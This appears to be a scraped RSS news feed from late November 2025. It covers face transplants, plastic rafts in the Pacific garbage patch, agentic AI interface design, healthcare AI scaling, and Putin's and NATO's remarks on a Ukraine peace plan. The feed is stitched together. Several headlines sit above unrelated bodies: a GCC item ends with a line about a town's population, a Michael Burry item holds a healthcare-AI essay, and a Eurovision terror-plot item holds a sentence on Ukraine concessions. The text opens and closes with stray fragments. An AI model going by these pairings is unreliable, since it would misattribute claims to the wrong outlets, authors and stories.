When earthquakes and tsunamis kill and maim, when children suffer painful illnesses and die young, where is the God who is supposedly all-powerful and all-good? When humans suffer severely, if the horrors are not caused by other human beings, it is called ‘natural evil’. For the theist, is natural evil more difficult to justify than moral evil?

About 50 face transplants have been performed globally since Isabelle Dinoire received her partial face graft at University Hospital CHU Amiens-Picardie in November 2005. A 2024 JAMA Surgery study reported five-year graft survival of 85% and 10-year survival of 74%, concluding that the procedure is "an effective reconstructive option for patients with severe facial defects." The study did not track psychological wellbeing, financial outcomes, employment status or quality of life. Roughly 20% of face transplant patients have died from rejection, kidney failure, or heart failure. 

The anti-rejection medications that keep transplanted faces alive can destroy kidneys and weaken immune systems to the point where routine infections become life-threatening. In the United States, the Department of Defense has funded most operations, treating them as a frontier for wounded veterans, because private insurers refuse to cover the costs. Patients who survive the surgery often find themselves unable to afford medications, transportation to follow-up appointments or basic caregiving. The field's long-term grants cover surgical innovation but not the lifelong needs of the people who receive these transplants.]]></content:encoded></item><item><title>Pope Leo XIV arrives in Istanbul in first foreign trip to Turkey</title><link>https://www.youtube.com/watch?v=sZav1ilND-k</link><author>Associated Press</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/sZav1ilND-k?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 19:58:53 +0000</pubDate><source url="https://www.youtube.com/channel/UC52X5wxOL_s5yw0dQk7NtgA">News - AP</source><content:encoded><![CDATA[The pope is on his first foreign trip to Turkey and Lebanon, marking a significant Christian anniversary and promoting peace amid global tensions.

Marine researchers, however, are now seeing something very different: places like the Great Pacific Garbage Patch where plastic waste has built a kind of artificial shoreline far from any land.In the North Pacific Subtropical Gyre, the huge rotating current system between California and Hawaii, floating objects tend to get trapped instead of drifting away. That’s where you find what people commonly call the Great Pacific Garbage Patch, a region that now holds tens of thousands of tons of plastic pieces sturdy enough to move around the ocean for years at a time.Old ideas about offshore lifeFor a long time, biologists treated coastal waters and the open ocean as two separate neighborhoods. Coastal species were expected to stay on rocks, piers, and shorelines, while pelagic species were the ones that belonged offshore. People knew that a storm could knock a log or a raft of seaweed loose and carry coastal organisms away from land, but the usual assumption was that those passengers would eventually die because conditions in the open ocean were too harsh.A big clue that this view was incomplete came after the Great East Japan Tsunami. The huge waves ripped loose docks, boats, and many plastic objects and sent them drifting into the Pacific. For years afterward, pieces of that debris landed on beaches in North America and Hawaii. When scientists checked those objects, they found that many Japanese coastal species had stayed alive on them for at least six years as they crossed the ocean. That led to a new question: were these coastal species only passing through the open ocean, or were they beginning to form more permanent communities there?Studying the Great Pacific Garbage PatchTo explore that question, scientists joined research cruises to the eastern side of the gyre. Standing on deck, crew members watched the sea surface and picked out plastic items at least 6 inches (15 centimeters) long.In the end they brought on board 105 pieces of floating plastic, including bottles, buoys, crates, nets, ropes, and buckets, along with a “wildcard” group of especially life‑covered objects. Every item was labeled, photographed, and tagged with its position before being set aside for careful study back in the lab.Back in the laboratory, taxonomists went through each piece of plastic and looked for invertebrates – animals without backbones. They found a wide variety of creatures, such as barnacles, crabs, amphipods, bryozoans, hydroids, and sea anemones. Altogether they identified 46 different kinds of invertebrates from six major animal groups. Of those 46, 37 were coastal species and 9 were pelagic, which means roughly 80% of the diversity on the debris came from coastal organisms.Life in the Great Pacific Garbage PatchWhen the team checked the plastic, almost every piece they had picked up was carrying life, mostly invertebrates. Invertebrates were present on 98% of the objects. Pelagic species showed up on more than 94% of the pieces, and coastal species on a bit over 70%. Many items hosted both coastal and pelagic species at the same time, so these very different organisms were sharing the same floating “islands” in the middle of the ocean.On average, each plastic item carried about four to five kinds of organisms, and coastal species were slightly more common than pelagic ones. Nets and ropes tended to have especially dense communities, probably because their many strands and small spaces offered plenty of places to hang on and hide.One of the biggest questions was whether coastal organisms were just temporary passengers on the plastic or whether they could live out their whole life cycles there. The team looked for evidence of reproduction and growth. They searched for brooding females – females carrying eggs or young – in several crustacean groups such as amphipods and crabs, and they did find them. They also saw reproductive structures on hydroids.The scientists also measured individual animals and noted the range of sizes on each piece of debris. On some species of sea anemones and amphipods they saw tiny juveniles, medium‑sized individuals, and full‑grown adults all living together on the same plastic surface. That pattern suggests that new generations were growing up on these rafts instead of all arriving at the same time from the coast.Why some life thrives on plasticTo understand why some species handle this lifestyle better than others, the researchers looked at traits that might be useful on a plastic raft. They noted whether adults stayed fixed in place (sessile) or could move around, and they recorded how each species fed – for example, by filtering particles from the water, grazing on surfaces, hunting prey, or using more than one of these methods.Many of the coastal species living on the plastic were able to reproduce asexually, essentially cloning themselves. Their larvae also did not need to spend much time drifting freely in the water. Young animals could grow right on the same surface as the adults. That kind of life cycle fits well with a small, isolated raft of plastic that slowly circles within the gyre.Interestingly, pelagic communities were strongly linked to the type of plastic object, while coastal communities were more tied to when the debris was collected during the cruises.The researchers then compared these gyre communities with earlier work on debris from the 2011 tsunami. Many of the coastal species found on plastics in the gyre had also been seen on Japanese tsunami debris that later washed ashore in North America and Hawaii. However, the groups that were most diverse were not exactly the same, and some coastal groups, such as mollusks, were much less common in the gyre. Overall, the gyre debris supported fewer species than the tsunami debris, and the researchers’ analyses suggested that there are probably still coastal species living on plastics in the gyre that scientists have not yet recorded.Great Pacific Garbage Patch lessonsTaken together, these results point to the rise of a “neopelagic” community in the open ocean, where “neo” means new and “pelagic” refers to life in the open sea. This neopelagic community includes both the usual pelagic rafters and coastal species that can now survive far from land because plastic items act as durable homes.In the past, one big reason coastal species stayed near shore was the lack of long‑lasting, floating hard surfaces in the open ocean. Human‑made plastics have changed that by adding countless new floating “islands” for coastal life in waters that used to be almost entirely pelagic. Plastic pollution is, therefore, not only an eyesore or a trash problem; it also shifts where marine life can live and allows coastal organisms to survive, reproduce, and spread across huge distances.This discovery may reshape marine ecosystems and species ranges around the world.]]></content:encoded></item><item><title>GCC 16 Switches To Using C++20 Standard By Default</title><link>https://www.phoronix.com/news/GCC-16-Now-CPP20-Default</link><author>Michael Larabel</author><category>tech</category><pubDate>Thu, 27 Nov 2025 19:47:36 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Following up on the discussion from earlier this month among GCC developers over switching to C++20 by default for the GCC compiler as the default C++ standard when not otherwise set, that change has indeed happened.

This claim also seems dubious, given that the town had only about 10,800 residents in peacetime.]]></content:encoded></item><item><title>Agentic UX Over &quot;Chat&quot;: How to Design Multi-Agent Systems People Actually Trust</title><link>https://hackernoon.com/agentic-ux-over-chat-how-to-design-multi-agent-systems-people-actually-trust?source=rss</link><author>Victor Churchill</author><category>tech</category><pubDate>Thu, 27 Nov 2025 19:38:41 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[When I was first tasked with integrating generative AI into Viamo’s IVR platform, serving millions of people across Africa and Asia’s emerging markets, it didn’t take me long to recognise that we couldn’t just stick a chat interface on it and call it a day, as much as that would simplify some of our technical and development challenges. To be clear, we were designing for people who rely on voice interfaces strictly because they need this kind of information about healthcare, agriculture, and finance, and they have little patience for AI that fails them or gives them the wrong information when they have limited time and limited bandwidth.That project taught me a lesson about designing for AI that I think all designers should learn: Designing for agentic AI is not about making it chat-friendly, but about designing intelligent systems that can work reliably, transparently, and predictably inside of workings that people already trust. Over seven years of designing products, spanning fintech, logistics, and software platforms, I have realised that the most effective way of implementing AI is not about replacing human judgement, but about augmenting it in ways that people can, and ultimately, will trust.The Fatal Flaw of Chat-First ThinkingThere is a dangerous paradigm that has been ingrained in this industry because of its obsession with chat interfaces on AI products, and that is that everyone is trying to build a “ChatGPT for Y”. No one stops and says, “Well, actually, just because we can build this and chat is a part of it, that doesn’t actually have anything to do with whether or not chat interaction is actually what we need on this.”That’s not necessarily true. Chat is perfect for open-ended exploration and creative tasks that involve journeys as much as they involve destinations. But most business tasks demand accuracy, auditability, and repeatability. When designing the supplier interface for Waypoint Commodities, a system that deals with million-dollar fertiliser and chemical trade transactions, users didn’t require a user-friendly chat interface that could facilitate exploratory conversations about their transactions. They required interfaces that enabled AI systems to point out errors, identify optimal routes, and highlight compliance concerns without clouding critical transactions with any uncertainty or vagueness.The primary issue with chat-centric AI is that it enables decision-making under a facade of conversation. Users can’t easily inspect what information was used, what was applied, and what was explored as an alternative option. Of course, this is acceptable for low-stakes interrogations, but disastrous for consequential choices. When designing our shipment monitoring system that tracked orders all through fulfilment, our Waypoint project was facing a challenge that required users to be assured AI messages about potential delays or market fluctuations weren’t based on fictitious observations but on actual facts explored and verified by AI itself.Multi-Agent Systems Require Multi-Modal InterfacesBut then, a paradigm shift occurred within my thinking as I ceased designing only for one AI model and focused on designing for environments that consisted of multiple specialised AI entities operating together as a system.It meant that we had to forgo entirely the paradigm of a one-window chat system. Instead, we built a multi-window interface through which multiple interaction methods could be used simultaneously. Quick facts would get immediate responses through AI voice output. Troubleshooting would involve a guided interaction through which AI would answer preliminary questions before redirecting the user to an expert system. Users searching for information on government facilities would get formatted replies that would cite sources accordingly. All these methods of interaction would have distinct visual and audio signals that would build user expectation accordingly.These outcomes proved this strategy was valid, and we experienced improved accuracy of response of more than thirty per cent and heightened user engagement levels. Far more significantly, user abandonment levels decreased by twenty per cent as users ceased leaving conversations due to frustration of expectation mismatches. Since users understood they would be speaking to an AI system that had a certain body of knowledge as compared to waiting for human expertise, they adjusted their levels of enquiry and patience accordingly.Designing for Verification, Not Just AutomationOne of the most important principles of agentic UX design that I uphold is that ‘automation without verification’ is merely ‘technical debt masquerading as AI.’ There should be an ‘escape hatch’ provided alongside each AI ’agent’ used in a system, allowing ’users to validate its reasoning’ and ‘override its decision’ as and when required, ’not because one lacks faith’ in AI ’abilities,’ but because one ’respects the fact’ that ’users have final responsibility’ when ’in regulated environments or high-value transactions.’When I was responsible for designing the admin dashboard for onboarding new users at Waypoint, we had a typical case of an automation project, the kind that would enable AI processing of incorporation documents, abstracting essential information, and automatically populating user profiles, thereby reducing user onboarding from several hours into just minutes. Of course, we understood that inaccuracies could potentially lead a company into a case of non-compliance or, worse, create fraudulent user profiles. So, we realised that we don’t need more accurate AI processing as a remedy to this problem, but rather to create a system of verification that would involve AI-generated user profiles, pending activation by human admins.In our interface, we implemented the following system for indicating AI confidence levels for each field that was extracted:Fields that had high levels of accuracy had black text colour and green tick marks;Medium accuracy had orange colour, and a neutral symbol was used;Fields that had low accuracy or missing information had red colour and a warning symbol.To identify any errors that AI systems had missed, thirty seconds per profile was enough time for admins, as they got enough context through this system.But the outcome was clear: we achieved a reduction of onboarding time of forty per cent over fully manual methods and greater accuracy than human or AI approaches alone. But more significantly, the admin personnel trusted this system because they could actually follow its logic. If there was any error on the AI’s part, that was pointed out quite easily through the verification page, and this helped build that all-important trust that enabled us to successfully roll out other AI functionality later on.Progressive Disclosure of Agent CapabilitiesAnother subtle but essential area of agentic UX that most designers struggle with is providing users with information about what their agents can and cannot accomplish without overwhelming them with possibilities and potential applications of these capabilities. Such is especially true for systems that apply generative AI, and as we struggled at work at FlexiSAF Edusoft, where I developed these systems, they have applications that range widely but are unpredictable across different tasks or activities. Users, in this case students and parents, would need direction through often complex admission procedures and, on the other hand, would need to be informed of what responses could be provided by AI and what would require human interaction.Our implementation provided capability hints based on interaction, meaning that as one used the system, they would be provided with examples of questions that the AI was strong at answering versus questions that could be more appropriately answered by the human resources people at the institution, meaning that as a user typed questions about application deadlines, they would see examples of questions that the AI was strong at answering, such as “When is the deadline for engineering applications?” as opposed to questions they could more effectively answer, for instance, “Can I be exempted from payment of application fees?”Additionally, we enabled a feedback cycle through which users could express whether their question had been fully answered by an AI response or not. This was not only for improving the model, but it enabled a UX feature through which users could express that they required escalation of their issue and that they had been left stranded by an AI system. Relevant resources would be provided through this system, and, if not, they would be connected with human resources as well, thus resulting in a support ticket decrease but without sacrificing user satisfaction, as people would feel that they had been listened to and that they had not been left stranded through an AI system. Transparency and Its Usefulness as a Trust-Building FactorTrust, of course, is not established by improved AI algorithms but by transparent system design that allows a user to see what the system knows, why it made its conclusions, and where its limitations are. eHealth Africa, our project involving logistics and data storage of supply chains in the medical sector, made this one of its non-negotiables: ’If AI computer agents predicted the timing of vaccine shipments or indicated optimal routes for delivery, these justifications had to be explainable, because human decision-makers would be deciding whether rural clinics received life-saving commodities on time.’To address this, we built what I call “reasoning panels” that provided output alongside AI suggestions. These reasoning panels did not display model details of its computations, only information about why it reached its recommendations, including road conditions, previous delivery times for this route, weather, and transport capacity available. The reasoning panels enabled field operatives to quickly ascertain if they had been getting outdated advice from AI or if they had neglected an essential, more recently available fact, such as a bridge closure, and made them indispensable and transparent rather than opaque decision-makers, as would be the case for black boxes.Transparency was required, and this was true for failure as well as success. To this end, we built helpful failure states that would describe why the AI was unable to offer its recommendation as opposed to falling back on some generic error message. If, for instance, it was unable to offer an optimal route because it lacked connectivity information, this was explicitly communicated, and the user was informed of what they could do if they still had no route recommendation available.Designing Handoffs Between Agents and HumansBut perhaps one of most undeveloped themes of agentic UX is that of handover, or exactly when and exactly how an AI agent is supposed to pass control of a system or of an interaction over to a human, whether that human be a colleague or be themselves a user of that system or interaction. This is precisely where most of the loss of trust occurs within multi-agent systems, and this was actually one of the first projects that I engaged that dealt explicitly with this issue, that of Bridge Call Block for Viamo, which was a system that transferred users from IVR interactions to human customer service reps.Our protocol for context transfer was designed such that after every interaction of the AI, a structured summary was displayed on the screen of the operator before they could greet the user, and this summary contained what was asked by the user, what the AI intended to say, and why the AI escalated this call. There was no need for users to be asked to repeat what they had asked, and all interaction context was available to the operators, and this small detail of interaction design vastly improved average handling time and user satisfaction, as people felt they had been respected and that their time had not gone to waste.The handoff from human to AI agent had to be considered equally carefully in reverse. In cases that called on the operators to refer their users back to the automated system, user interface functionality was used effectively by the operators to communicate adequate expectations of AI autonomy based on certain tasks that would enable users to be referred back to the automated system, as opposed to doing so with expected frustrations.Principles of Pragmatic Design of Agentic UXAs a practitioner designing AI-enabled systems for many years, today I have formulated some pragmatic guidelines that help me design agentic UX effectively:Firstly, design for the workflow, not for technology. Users don’t care whether they’re being helped through AI, rules, or human intelligence. They only care about whether they can accomplish their tasks effectively and conveniently. Begin by reverse-engineering from the target outcome, identifying areas of added value and added complexity due to AI-enabled agents, and then stop and proceed accordingly.Secondly, define meaningful boundaries of AI-enabled agents. Users need to be aware of when they are leaving one realm of intelligence and entering other realms, such as the intelligence of retrieval, model intelligence, and human intelligence, and establish consistent visual and interaction guidelines accordingly, such that they don’t wonder what kind of answer they’re going to get and when they’re going to get it.Thirdly, build verification into your workflow design respecting user expertise. AI systems should ideally help hasten decision-making by bringing up pertinent information and suggesting courses of action, but these should ultimately be made by human users who possess context unavailable to AI systems themselves. Designing decision verification flows into AI system user interfaces that facilitate this would be ideal.Because of projects that have successfully secured funding, boosted engagement by definite increments, and processed user figures in the thousands, we didn’t succeed because we possessed, or attempted to create, sophisticated AI systems. It is because we provided these users, through our interface, the ability to comprehend what was happening on their end of this AI system and, through that, helped them trust it enough to accomplish increasingly complex tasks over time that has truly made them successful examples of agentic UX.]]></content:encoded></item><item><title>This Thanksgiving’s real drama may be Michael Burry versus Nvidia</title><link>https://techcrunch.com/2025/11/27/this-thanksgivings-real-drama-may-be-michael-burry-versus-nvidia/</link><author>Connie Loizos</author><category>tech</category><pubDate>Thu, 27 Nov 2025 19:32:21 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[Is Burry the canary in the coal mine, warning of a collapse that's inevitable?

It was a problem of performance, throughput, and infrastructure.In fact, our first diagrams revolved around APIs, databases, and cloud scaling policies. We wanted the system to handle thousands of concurrent users and millions of records without breaking a sweat.But a few months into development, as we started testing with clinicians, our view of scalability changed completely. We learned that in healthcare, scale is not only about how much data you can process or how fast your inference runs. It is about how effectively you can expand , , and  without breaking the ethical fabric that healthcare relies on.The project — an AI- and React-based platform designed to personalize learning paths for nurses and healthcare workers — became an eye-opener. It was meant to help medical professionals identify skill gaps, complete relevant training, and track progress through an intelligent recommendation system. But success wasn’t measured by technical benchmarks alone. It was measured by adoption, confidence, and measurable improvement in learning outcomes.How to Scale AI Systems for Healthcare - Based on Practical ExperienceBelow I have mentioned the five principles that guided us as we learned how to architect AI systems for healthcare that truly scale.1. Start by Scaling TrustEvery AI product depends on trust, but in healthcare it is everything. When we rolled out the first version of our recommendation engine, it performed impressively in internal tests. The AI could predict learning needs and suggest modules with high accuracy. Yet the clinicians who tried it were hesitant. Their first question wasn’t “How fast is it?” Instead, it was “How do I know this suggestion is right?”That question reshaped our design philosophy. We realized that explainability had to be a feature, not a footnote. So, we made every recommendation transparent: each suggestion came with a confidence score, an explanation of what data informed the choice, and a simple breakdown of learning objectives.Once users could see  the system thought a particular course mattered to them, skepticism turned into curiosity, and curiosity turned into trust. Only then did engagement and scalability follow.Technical scale means nothing without emotional scale, and trust is the emotional layer that allows AI to grow within healthcare ecosystems.In most software projects, compliance is seen as a checklist at the end of the development cycle. In healthcare, that approach is a recipe for re-architecture.Early on, our data scientists wanted to move fast: ingest data, train models, and deploy updates weekly. But healthcare operates under strict regulations like HIPAA and GDPR. Patient-related information had to remain confidential, auditable, and tamper-proof. The architecture itself had to enforce those rules, not rely on human vigilance.We re-engineered our data flow so that sensitive data was encrypted at rest and in transit. Personally identifiable information was pseudonymized before entering the AI pipeline, and every inference produced an immutable audit trail. These weren’t just technical decisions but they were architectural boundaries that allowed our system to grow safely.By embedding compliance in architecture, we created a foundation where scaling to more clinics and locations became straightforward. Every new location didn’t require a fresh legal review of our processes, because compliance was literally built into the system’s DNA. Scalability became easier because 3. Build Modular Systems That Learn and EvolveAI systems in healthcare are living organisms and they must adapt as medical knowledge, treatment protocols, and learning behaviors evolve. The only sustainable way to support that evolution is modularity.We designed the platform around independent modules: a recommendation engine, a learner-behavior analyzer, and a React-based engagement dashboard. Each component communicated through APIs, allowing updates without touching the others. When our data team built an improved analytics model months later, it slotted neatly into the system without downtime.This modularity also made scaling across different healthcare organizations effortless. One of the clinics, for example, wanted deeper analytics while another wanted simpler dashboards. We could toggle modules on or off without rewriting the entire stack.True scalability, we realized, doesn’t mean building a single large system but building  that can grow and mutate as needs evolved. It was our insurance against change.4. Human-Centered Scaling Beats Pure AutomationIn AI projects, there’s constant pressure to reduce human intervention with fewer labels, faster feedback loops, and fancy, self-healing pipelines. But in healthcare, removing humans from the loop is the fastest way to lose credibility.We built feedback as a core feature, not an afterthought. Every new model iteration was validated by clinicians who tested the recommendations in real learning scenarios. Their qualitative insights around what felt intuitive and what seemed irrelevant helped shape retraining data far more effectively than metrics alone.One of my favorite milestones came when a group of nurses described the system as “a digital mentor” rather than “a tool.” That language shift showed real adoption. Over time, feedback from more than 500 healthcare professionals helped us refine algorithms, language tone, and even notification timing.5. Measure What Truly MattersWhen people talk about scalable AI, they often celebrate technical metrics: lower latency, higher throughput, and reduced compute cost. Those numbers look impressive on a slide deck, but in healthcare, they don’t mean much unless they translate into better outcomes.We shifted our measurement strategy early in the rollout. Instead of tracking CPU utilization or response times as success indicators, we focused on human-centric metrics: how much faster did new staff onboard? How often were training modules completed? How did clinicians rate their confidence before and after using the system?The results were rewarding: onboarding time dropped by 40 percent, course completion improved by 94 percent, and user satisfaction consistently climbed. These were the metrics that resonated with stakeholders because they reflected the real-world value of the system.When you measure what matters to humans, you end up scaling what matters to the organization. Infrastructure follows purpose.Redefining Scalability in Healthcare AILooking back, that project changed how I think about software architecture. Scalability is often portrayed as a purely technical victory… more users, more data, more uptime. But in healthcare AI, scaling without ethics or empathy is hollow progress.To scale responsibly, you must align growth with integrity. That means systems that can expand without eroding privacy, algorithms that can learn without losing explanability, and platforms that grow user confidence instead of dependence.Our AI learning platform succeeded not because it handled thousands of users, but because it earned their trust and kept it. Every technical improvement… from modular APIs to cloud elasticity, was valuable only insofar as it supported that human connection.The more I work in this field, the clearer it becomes: healthcare doesn’t need AI that scales endlessly. It needs AI that scales  If your architecture can grow in a way that safeguards patients, empowers clinicians, and enhances understanding, then it’s already scalable enough.Because in the end, true scalability in healthcare isn’t measured in requests per second, it is measured in trust per interaction.]]></content:encoded></item><item><title>Does Nigeria need foreign boots on the ground to deal with security crisis? | DW News</title><link>https://www.youtube.com/watch?v=F5lDjsH1mRE</link><author>DW News</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/F5lDjsH1mRE?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 19:15:08 +0000</pubDate><source url="https://www.youtube.com/channel/UCknLrEdhRCp1aegoMqRaCZg">News - DW</source><content:encoded><![CDATA[Nigerian President Bola Tinubu has declared a nationwide security emergency after a spate of attacks and mass kidnappings.

Putin ruled out signing any ceasefire deal before Ukrainian troops withdraw."If Ukraine's troops leave the territory occupied, then military action will stop. If they won't leave then we will achieve that by armed force," Putin said.He also said recognition of Russia's occupation of Crimea, Donbas and a swath of eastern and southern Ukraine must be part of negotiations with the U.S.Putin projected confidence about Russia's battlefield position, claiming there was a "positive dynamic" everywhere on the front. The president said Russia was "ready in principle" to "fight to the last Ukrainian."Ahead of Witkoff's expected trip to Moscow next week, Putin said the latest American peace proposals "can be the basis for future agreements.""Overall, we see that the American side is taking into account our position, which was discussed before Anchorage and after Alaska," he added, referring to his August summit with Trump. "In some areas, we definitely need to sit down and seriously discuss specific issues," Putin said.Putin also answered questions about a leaked recording of a purported phone call between President Donald Trump's envoy Steve Witkoff and top Kremlin aide Yuri Ushakov, in which Witkoff appeared to be offering Ushakov advice on how Moscow could present its own peace plans to Trump."This may be some kind of fake news," Putin said. "Maybe they really did eavesdrop. Actually, this is a criminal offense; eavesdropping is illegal in our country. It's not about us. It's about the battle of opinions between the collective West and the U.S. over what needs to be done to end the hostilities."Othon Leyva contributed to this report.]]></content:encoded></item><item><title>Motorola Survived the iPhone By Returning to Its Public Safety Roots</title><link>https://www.youtube.com/shorts/ua7zeuStgAo</link><author>Bloomberg Television</author><category>news</category><enclosure url="https://www.youtube.com/v/ua7zeuStgAo?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 19:01:04 +0000</pubDate><source url="https://www.youtube.com/channel/UCIALMKvObZNtJ6AmdCLP7Lg">News - Bloomberg </source><content:encoded><![CDATA[Motorola survived the iPhone and became a company worth over $60 billion by doubling down on public safety and dealmaking.

In his view, the 28-point peace plan promoted by the US administration is "a Russian plan to make Ukraine capitulate," and US President Donald Trump is "just a week from taking from Putin everything.""I am very surprised that Donald Trump runs like an errand boy for Putin's capitulation plan," Terras said.Last week, a leaked text of a peace settlement seen as too favourable to Moscow sparked concerns among Europeans. The plan which has been redrafted but not finalised called for a reduction of the Ukrainian army, sweeping territorial concessions, and the imposition of a NATO membership veto on Kyiv, among other conditions seen as akin to capitulation. Representatives of the US government led by Secretary of State Marco Rubio, Ukrainian officials and a European delegation met on Sunday in Geneva to discuss amendments to the plan. Europeans hope their input will buy Kyiv time and sway Trump in their direction. On Wednesday, speaking from Strasbourg, European Commission President Ursula von der Leyen warned the "Russian playbook" of aggression has not changed, and Ukraine could be just the start. To help Kyiv, which will require additional funding next year, the Europeans are debating issuing an unprecedented reparations loan pegged to the Russian frozen assets held in Belgium. Sources told Euronews the Commission is preparing further legal work to ensure the proposal can get the green light from the Belgian authorities, as the country holds the assets. The document could be published as early as Thursday. There is growing frustration with the Belgians' lack of progress. In reaction, MEP Terras said: "We are already too late, we have to start the financing very quickly"."Don't tell me that the EU, with a population of 500 million and a GDP of €29 trillion, is not able to support Ukraine with a much smaller amount."According to Terras, "European people do not understand the urgency of the situation. It is not only about Ukraine."]]></content:encoded></item><item><title>Running Kubernetes in the homelab</title><link>https://www.reddit.com/r/kubernetes/comments/1p89ywo/running_kubernetes_in_the_homelab/</link><author>/u/AlertKangaroo6086</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Thu, 27 Nov 2025 18:51:31 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I’ve been wanting to dip my toes into Kubernetes recently after making a post over at r/homelabIt’s been on a list of things to do for years now, but I am a bit lost on where to get started.

            Russian President Vladimir Putin said that a US plan to end the war in Ukraine could “form the basis for future agreements” but renewed threats to seize more territory by force unless Kyiv withdraws.
    
            Speaking to reporters in Bishkek, in the Central Asian republic of Kyrgyzstan on Thursday, Putin confirmed the Kremlin was expecting a US delegation headed by Special Envoy Steve Witkoff to visit Moscow early next week, adding that the Kremlin was ready for “serious discussion”.
    
            But chances of a swift breakthrough appear slim after Putin repeated his maximalist demands, saying the war in Ukraine will only end “once Ukrainian troops withdraw from the territories they occupy.”
    
            “If they don’t withdraw, we will achieve this through military means,” the Russian leader said.
    
            Ukrainian President Volodymyr Zelensky said his delegation will also meet with US officials by the end of this week to discuss points set out in Geneva. Speaking in his nightly video address, Zelensky added that next week will see “important negotiations not only for our delegation, but also for me personally,” without providing further details.
    
            Russia is occupying some 20% of the territory recognized under international law as part of sovereign Ukraine, including almost all of the Luhansk region, and parts of the Donetsk, Kherson and Zaporizhzhia regions.
    
            Moscow is demanding Ukraine surrender the entirety of these four regions, which it has annexed but not fully conquered.
    
            Russia has made some gains along the eastern Ukrainian frontline in recent weeks, most significantly around the city of Pokrovsk.
    
            Still, the Institute for the Study of War, a US-based conflict monitor, said on Thursday that data on Russian forces’ rate of advance indicates that “a Russian military victory in Ukraine is not inevitable, and a rapid Russian seizure of the rest of Donetsk Oblast is not imminent.”
    
            Crucially, the area Russia is demanding includes the “fortress belt” of heavily defended towns and cities seen that are seen as vital for Ukrainian security. Kyiv and its European allies have made it clear that territorial concessions are a red line for them.
    
            Putin’s remarks on Thursday were the strongest indication that Russia is not willing to move after US officials, including Trump himself, touted “tremendous progress” being made on their efforts to end the war.
    
            This came after Ukrainian and European officials strongly opposed and then revised the 28-point peace plan which was drafted by the US with apparent strong input from Russia.
    
            The original plan reflected Russia’s extensive wishlist, and included a demand for Ukraine to reduce its army and be barred from joining NATO.
    
            Putin said on Thursday that he was expecting Witkoff to arrive to Moscow early next week, presumably to discuss the new draft of the plan, the exact wording of which is not yet known.
    
            Putin said he has been informed of the latest discussions and that the plan could “form the basis for future agreements.”
    
            “It would be impolite of me to speak of final agreements now,” Putin added.

"But within the Alliance, membership requires unanimity," adding that several NATO allies, including the United States, oppose Kyiv's entry.Rutte's remarks came amid a week of intense diplomacy, after the United States reinvigorated peace talks with a controversial 28-point plan widely viewed as favoring Russia.While the proposal has since been pared down following conversations with Ukraine and Europe following consultations with Ukraine and European partners, the original version reportedly included provisions barring Ukraine's NATO aspirations — effectively stipulating a Russian veto of Ukraine's membership in the alliance.Moscow has long claimed that NATO expansion forced it into war, although Ukraine is not a NATO member. Following the invasion, Sweden and Finland both joined the alliance, citing Russia as a security concern.He also added that the latest version of the peace plan, which emerged after negotiations in Geneva, provided a "good foundation for further discussions," but added that any proposal will require a "separate, parallel discussion" with NATO "on certain issues.""When you look at the peace plan (we) want to ensure that Putin never tries to attack Ukraine again," Rutte said. "If NATO membership is not an option, we must at least provide security guarantees that are strong enough to make Russia never try again."Rutte also noted that Russia’s offensive progress in 2025 remains minimal, adding that Moscow "advances only a few meters a day" and has struggled for 18 months to seize Pokrovsk. Located in northwestern part of Donetsk Oblast, the city of Pokrovsk has been at the epicenter of fierce fighting along the Russian-Ukrainian line over the past year. Small Russian units, oftentimes lone individuals, have been infiltrating the city, sometimes dressed as civilians, the military has previously reported.Regardless of how current peace efforts unfold, Rutte believes that "Russia will remain a long-term threat for a long time.""If a Russian president is willing to sacrifice a million people from his own people for this fallacy of correcting history, we must be prepared," he said, adding that this is why "we must spend much more on our defense." Rutte stressed that "a peace plan does not change the assessment of Russia as a long-term threat to Europe."]]></content:encoded></item><item><title>Swedish man locked up for plotting chemical terror attack on Eurovision</title><link>https://www.politico.eu/article/swedish-man-sentenced-for-planning-terrorist-attack-on-eurovision-2020-rotterdam/</link><author>/u/LoneWolf_McQuade</author><category>news</category><category>reddit</category><pubDate>Thu, 27 Nov 2025 18:21:28 +0000</pubDate><source url="https://www.reddit.com/r/europe/top/?sort=top&amp;t=day&amp;limit=10">News - Reddit - Europe</source><content:encoded><![CDATA[The proposal will be difficult for Kyiv to swallow, as it includes making serious territorial concessions to Moscow.]]></content:encoded></item><item><title>Pope Leo XIV receives Thanksgiving gifts from reporters</title><link>https://www.youtube.com/watch?v=2YHTgl-CcUs</link><author>Associated Press</author><category>news&quot;</category><enclosure url="https://www.youtube.com/v/2YHTgl-CcUs?version=3" length="" type=""/><pubDate>Thu, 27 Nov 2025 18:09:42 +0000</pubDate><source url="https://www.youtube.com/channel/UC52X5wxOL_s5yw0dQk7NtgA">News - AP</source><content:encoded><![CDATA[Pope Leo XIV arrived on his first foreign trip to Turkey and later Lebanon, a visit that fulfills the late Pope Francis’ plans to mark an important Christian anniversary and bring a message of peace to the region at a crucial time for efforts to end the war in Ukraine and ease Mideast tensions.

Electric vehicles will be charged 3 pence per mile and plug-in hybrids 1.5 pence per mile, payable annually alongside car tax. An average driver covering 8,000 miles a year would pay around $320, roughly half what a petrol or diesel driver pays in fuel duty. 

